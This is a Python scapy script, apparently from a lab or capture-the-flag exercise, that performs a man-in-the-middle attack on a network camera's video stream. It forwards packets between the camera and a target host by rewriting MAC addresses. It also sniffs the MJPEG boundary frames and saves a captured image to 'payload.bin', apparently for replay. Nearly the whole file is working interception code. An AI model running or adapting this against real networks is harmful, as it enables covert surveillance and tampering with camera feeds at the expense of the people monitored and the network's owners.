from scapy.all import *
from copy import deepcopy

POS_LEN_IMG = 71
LEN_HEADER_BOUNDARY = 83

IPs = {
	"cam"   : "192.168.1.2",
	"target": "<A changer>",
	"my"    : "<A changer>"
}
MACs = {
	"cam"    : "<A changer>",
	"target" : "<A changer>",
	"my"     : "<A changer>"
}

img_part = []
ports = {}
is_init = False
port_init = -1

def is_boundary_frame(data: bytes):
	to_find = b"--BoundaryString"
	for i in range(100):
		if to_find == data[i:len(to_find)+i]: return True
	return False

def get_img_size(data: bytes) -> int:
	i = POS_LEN_IMG
	img_len = 0
	while 48 <= data[i] <= 57:
		img_len = (img_len*10) + (data[i] - 48)
		i += 1
	return img_len

def get_payload(ether):
	global IPs
	global MACs

	global img_part
	global ports
	global is_init
	global port_init

	if ether.type == 2048 and ether.dst == MACs["my"]:
		ip  = ether.payload
		tcp = ip.payload

		if ether.src == MACs["my"]: return None
		
		if tcp.dport == 8081: # redirige les paquetes de Rasp -> me to me -> CAM

			ether.src = ether.dst
			ether.dst = MACs["cam"]
			sendp(ether, iface="wlan0")
			
			if not tcp.sport in ports and is_init:
				ports[tcp.sport] = {
					"len_img": -1        ,
					"img_receive": False ,
					"size_receive": 0
				}



		if tcp.sport == 8081: # redirige les paquetes de CAM -> me to me -> Rasp

			ether.src = ether.dst
			ether.dst = MACs["target"]

			if type(tcp.payload) == scapy.packet.Raw:

				is_boudary = is_boundary_frame(tcp.payload.load)

				if (is_boudary or tcp.dport == port_init) and not is_init:
				
					if not tcp.dport in ports:
						ports[tcp.dport] = {
							"len_img": -1        ,
							"img_receive": False ,
							"size_receive": 0
						}

					if is_boudary:
						ports[tcp.dport]["len_img"] = get_img_size(tcp.payload.load) + LEN_HEADER_BOUNDARY
						print(f"Image sniffing with {ports[tcp.dport]['len_img']} size")

					port_init = tcp.dport
					img_part.append(deepcopy(tcp.payload.load))

					ports[tcp.dport]["size_receive"] += len(tcp.payload.load)

					if ports[tcp.dport]["size_receive"] >= ports[tcp.dport]["len_img"]:
						is_init = True

						# savegarde de l'image recue
						with open("payload.bin", "wb+") as payload:
							for _ in range(len(img_part)):
								payload.write(img_part[_])
							print(f"Saving of payload size of {ports[tcp.dport]['len_img']}")

			sendp(ether, iface="wlan0")

sniff(filter="ip", prn=get_payload)